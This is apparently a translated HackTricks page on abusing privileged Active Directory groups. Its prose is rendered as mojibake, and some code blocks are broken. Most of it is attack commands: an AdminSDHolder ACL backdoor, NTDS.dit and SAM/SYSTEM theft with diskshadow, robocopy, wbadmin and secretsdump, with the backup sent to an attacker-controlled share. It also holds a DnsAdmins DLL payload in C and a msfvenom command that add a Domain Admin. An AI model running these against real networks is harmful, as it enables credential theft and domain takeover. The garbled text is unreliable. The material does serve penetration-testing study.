# рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдд рд╕рдореВрд╣

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live) рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рд╡рд╛рд▓реЗ рдкреНрд░рд╕рд┐рджреНрдз рд╕рдореВрд╣

* **рдкреНрд░рд╢рд╛рд╕рдХ**
* **рдбреЛрдореЗрди рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ**
* **рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ**

## рдЦрд╛рддрд╛ рдСрдкрд░реЗрдЯрд░реНрд╕

рдпрд╣ рд╕рдореВрд╣ рдбреЛрдореЗрди рдкрд░ рдкреНрд░рд╢рд╛рд╕рдХ рдирд╣реАрдВ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдЦрд╛рддреЗ рдФрд░ рд╕рдореВрд╣ рдмрдирд╛рдиреЗ рдХреА рд╢рдХреНрддрд┐ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдпрд╣ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ (DC) рдореЗрдВ рд╕реНрдерд╛рдирд┐рдХ рд▓реЙрдЧрд┐рди рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рддрд╛ рд╣реИред

рдЗрд╕ рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдпреЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
рдирдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рд╕рд╛рде рд╣реА DC01 рдореЗрдВ рд╕реНрдерд╛рдирд┐рдХ рд▓реЙрдЧрд┐рди рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред

## AdminSDHolder рд╕рдореВрд╣

**AdminSDHolder** рд╕рдореВрд╣ рдХрд╛ рдкрд╣реБрдВрдЪрди рдирд┐рдпрдВрддреНрд░рдг рд╕реВрдЪреА (ACL) рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рднреА "рд╕рдВрд░рдХреНрд╖рд┐рдд рд╕рдореВрд╣реЛрдВ" рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕рдХреНрд░рд┐рдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╣реИрдВ, рдЙрдЪреНрдЪ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╕рдореВрд╣реЛрдВ рд╕рд╣рд┐рддред рдпрд╣ рддрдВрддреНрд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЗрди рд╕рдореВрд╣реЛрдВ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЕрдирдзрд┐рдХреГрдд рд╕рдВрд╢реЛрдзрдиреЛрдВ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдХрд┐рд╕реА рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЗрд╕рдХрд╛ рд╢реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **AdminSDHolder** рд╕рдореВрд╣ рдХреА ACL рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ, рдПрдХ рдорд╛рдирдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреВрд░реНрдг рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдкреНрд░рджрд╛рди рдХрд░рдХреЗ рдЗрд╕рдХрд╛ рд╢реЛрдз рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЙрди рд╕рднреА рд╕рдВрд░рдХреНрд╖рд┐рдд рд╕рдореВрд╣реЛрдВ рдкрд░ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░реЗрдЧрд╛ред рдпрджрд┐ рдЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╕рдВрд╢реЛрдзрд┐рдд рдпрд╛ рд╣рдЯрд╛ рджреА рдЬрд╛рддреА рд╣реИрдВ, рддреЛ рдЙрдиреНрд╣реЗрдВ рд╕реНрд╡рдпрдВ рд╣реА рдПрдХ рдШрдВрдЯреЗ рдХреЗ рднреАрддрд░ рдкреБрдирдГ рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рдкреНрд░рдгрд╛рд▓реА рдХреЗ рдбрд┐рдЬрд╝рд╛рдЗрди рдХреЗ рдХрд╛рд░рдгред

рд╕рджрд╕реНрдпреЛрдВ рдХреА рд╕рдореАрдХреНрд╖рд╛ рдФрд░ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдбреНрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЙрдкрд▓рдмреНрдз рд╣реИ рдЬреЛ рдкреБрдирд░реНрд╕реНрдерд╛рдкрди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рддреЗрдЬреА рд╕реЗ рдкреВрд░рд╛ рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреА рд╣реИ: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП, [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) рдкрд░ рдЬрд╛рдПрдВред

## AD Recycle Bin

рдЗрд╕ рд╕рдореВрд╣ рдореЗрдВ рд╕рджрд╕реНрдпрддрд╛ рд╡рд┐рд▓реАрди рдХрд┐рдП рдЧрдП рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рдХрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдПрдХреНрд╕реЗрд╕

DC рдкрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдХреЗрд╡рд▓ рддрдм рд╣реЛрддреА рд╣реИ рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ `Server Operators` рд╕рдореВрд╣ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИ, рдЬреЛ рдкрд╣реБрдВрдЪ рдХрд╛ рд╕реНрддрд░ рдмрджрд▓ рджреЗрддрд╛ рд╣реИред

### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐

`PsService` рдпрд╛ `sc` рдХрд╛ рдЙрдкрдпреЛрдЧ Sysinternals рд╕реЗ рдХрд░рдХреЗ, рдХреЛрдИ рд╡реНрдпрдХреНрддрд┐ рд╕реЗрд╡рд╛ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдФрд░ рд╕рдВрд╢реЛрдзрди рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `Server Operators` рд╕рдореВрд╣ рдХреЗ рдкрд╛рд╕ рдХреБрдЫ рд╕реЗрд╡рд╛рдУрдВ рдкрд░ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╡рд┐рднрд┐рдиреНрди рдЖрджреЗрд╢реЛрдВ рдХрд╛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ рд╕рдВрднрд╡ рд╣реЛрддреА рд╣реИ:
```cmd
C:\> .\PsService.exe security AppReadiness
```
рдпрд╣ рдХрдорд╛рдВрдб рджрд┐рдЦрд╛рддреА рд╣реИ рдХрд┐ `рд╕рд░реНрд╡рд░ рдСрдкрд░реЗрдЯрд░реНрд╕` рдХреЗ рдкреВрд░реНрдг рдПрдХреНрд╕реЗрд╕ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рдКрдВрдЪрд╛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЗ рд▓рд┐рдП рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

## рдмреИрдХрдЕрдк рдСрдкрд░реЗрдЯрд░реНрд╕

`рдмреИрдХрдЕрдк рдСрдкрд░реЗрдЯрд░реНрд╕` рд╕рдореВрд╣ рдореЗрдВ рд╕рджрд╕реНрдпрддрд╛ `DC01` рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ `SeBackup` рдФрд░ `SeRestore` рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реИрдВред рдпреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдлрд╝реЛрд▓реНрдбрд░ рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓, рд╕реВрдЪреАрдХрд░рдг, рдФрд░ рдлрд╝рд╛рдЗрд▓ рдХреЙрдкреАрдВрдЧ рдХреНрд╖рдорддрд╛рдПрдБ рд╕рдХреНрд╖рдо рдХрд░рддреЗ рд╣реИрдВ, рдпрд╣рд╛рдБ рддрдХ рдХрд┐ `FILE_FLAG_BACKUP_SEMANTICS` рдлрд╝реНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдмрд┐рдирд╛ рднреАред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЖрд╡рд╢реНрдпрдХ рд╣реИред

рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдпреЛрдВ рдХреЛ рд╕реВрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рдХрд░реЗрдВ:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### рд╕реНрдерд╛рдиреАрдп рд╣рдорд▓рд╛

рдЗрди рдкреНрд░рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд░рдг рдЕрдкрдирд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ:

1. рдЖрд╡рд╢реНрдпрдХ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЛ рдЖрдпрд╛рдд рдХрд░реЗрдВ:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` рд╕рдХреНрд╖рдо рдХрд░реЗрдВ рдФрд░ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░реЗрдВ:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. рдкрд╣реБрдВрдЪ рдФрд░ рдлрд╝рд╛рдЗрд▓реЗрдВ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдФрд░ рдХреЙрдкреА рдХрд░реЗрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD рд╣рдорд▓рд╛

рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреЗ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХрд╛ рд╕реАрдзрд╛ рдЙрдкрдпреЛрдЧ `NTDS.dit` рдбреЗрдЯрд╛рдмреЗрд╕ рдХреА рдЪреЛрд░реА рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдФрд░ рдХрдВрдкреНрдпреВрдЯрд░реЛрдВ рдХреЗ рд▓рд┐рдП рд╕рднреА NTLM рд╣реИрд╢ рд╣реЛрддреЗ рд╣реИрдВред

#### diskshadow.exe рдХрд╛ рдЙрдкрдпреЛрдЧ

1. `C` рдбреНрд░рд╛рдЗрд╡ рдХреА рд╢реИрдбреЛ рдХреЙрдкреА рдмрдирд╛рдПрдВ:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. рд╢реИрдбреЛ рдХреЙрдкреА рд╕реЗ `NTDS.dit` рдХреА рдХреЙрдкреА рдХрд░реЗрдВ:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
рд╡рд┐рдХрд▓реНрдк рд╕реЗ, рдлрд╝рд╛рдЗрд▓ рдХреА рдХреЙрдкреА рдХреЗ рд▓рд┐рдП `robocopy` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. рд╣реИрд╢ рдкреНрд░рд╛рдкреНрддрд┐ рдХреЗ рд▓рд┐рдП `SYSTEM` рдФрд░ `SAM` рдХреЛ рдирд┐рдХрд╛рд▓реЗрдВ:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit` рд╕реЗ рд╕рднреА рд╣реИрд╢ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рдЧреНрд░реБрдк рдФрд░ рдЯреЛрдХрди рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреЗрд╕

1. рд╣рдорд▓рд╛рд╡рд░ рдорд╢реАрди рдкрд░ рдПрд╕рдПрдордмреА рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рдПрдирдЯреАрдПрдлрдПрд╕ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рд╕реЗрдЯрдЕрдк рдХрд░реЗрдВ рдФрд░ рд▓рдХреНрд╖рд┐рдд рдорд╢реАрди рдкрд░ рдПрд╕рдПрдордмреА рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреИрд╢ рдХрд░реЗрдВред
2. рд╕рд┐рд╕реНрдЯрдо рдмреИрдХрдЕрдк рдФрд░ `NTDS.dit` рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП `wbadmin.exe` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

рдПрдХ рд╡реНрдпрд╛рд╡рд╣рд╛рд░рд┐рдХ рдкреНрд░рджрд░реНрд╢рди рдХреЗ рд▓рд┐рдП, рджреЗрдЦреЗрдВ [рдбреЗрдореЛ рд╡реАрдбрд┐рдпреЛ рд╡рд┐рде рдЖрдИрдкреАрдкреАрдПрд╕реЗрдХ](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

**DnsAdmins** рдЧреНрд░реБрдк рдХреЗ рд╕рджрд╕реНрдп рдЕрдкрдиреА рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреЗрд╕ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрд░реНрдмрд┐рдЯреНрд░реЗрд░реА DLL рдХреЛ рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреЗрд╕ рдХреЗ рд╕рд╛рде рдПрдХ DNS рд╕рд░реНрд╡рд░ рдкрд░ рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдЕрдХреНрд╕рд░ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдкрд░ рд╣реЛрд╕реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдХреНрд╖рдорддрд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╢реЛрд╖рдг рд╕рдВрднрд╛рд╡рдирд╛ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред

DnsAdmins рдЧреНрд░реБрдк рдХреЗ рд╕рджрд╕реНрдпреЛрдВ рдХреА рд╕реВрдЪреА рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП, рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░реЗрдВ:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### рдХрд╛рд░реНрдпрд╛рддреНрдордХ DLL рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░реЗрдВ

рд╕рджрд╕реНрдп DNS рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ рдХрд╛рд░реНрдпрд╛рддреНрдордХ DLL рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
**Translation:**
```
DNS рд╕реЗрд╡рд╛ рдХреЛ рдкреБрдирдГ рдЖрд░рдВрдн рдХрд░рдирд╛ (рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдЖрд╡рд╢реНрдпрдХ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ) DLL рдХреЛ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ:
```
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
### Mimilib.dll
рдорд┐рдореАрд▓рд┐рдм.dll рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП, рдЗрд╕реЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрдорд╛рдВрдб рдпрд╛ рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓реНрд╕ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ред [рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдПред

### WPAD Record for MitM
DnsAdmins DNS рд░рд┐рдХреЙрд░реНрдб рдХреЛ рдорд╛рди-рдЗрди-рдж-рдорд┐рдбрд▓ (MitM) рд╣рдорд▓реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЧреНрд▓реЛрдмрд▓ рдХреНрд╡реЗрд░реА рдмреНрд▓реЙрдХ рд╕реВрдЪреА рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдПрдХ WPAD рд░рд┐рдХреЙрд░реНрдб рдмрдирд╛рдХрд░ред рд░рд┐рд╕реНрдкреЙрдиреНрдбрд░ рдпрд╛ рдЗрдирд╡реЗрдЧ рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реНрдкреВрдлрд┐рдВрдЧ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### Event Log Readers
рд╕рджрд╕реНрдп рдШрдЯрдирд╛ рд▓реЙрдЧ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдЬреИрд╕реЗ рд╕рд╛рджрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдпрд╛ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рд╡рд┐рд╡рд░рдг рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## рдПрдХреНрд╕рдЪреЗрдВрдЬ рд╡рд┐рдВрдбреЛрдЬрд╝ рдЕрдиреБрдорддрд┐рдпрд╛рдБ
рдпрд╣ рд╕рдореВрд╣ рдбреЛрдореЗрди рдСрдмреНрдЬреЗрдХреНрдЯ рдкрд░ DACLs рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ DCSync рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рд╕рдореВрд╣ рдХрд╛ рд╢рд╛рд╕рди рдЙрдиреНрдирддрд┐рдХрд░рдг рдХреЗ рд▓рд┐рдП рддрдХрдиреАрдХреЛрдВ рдХрд╛ рд╡рд┐рд╡рд░рдг Exchange-AD-Privesc GitHub рд░реЗрдкреЛ рдореЗрдВ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## рд╣рд╛рдЗрдкрд░-рд╡реА рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ
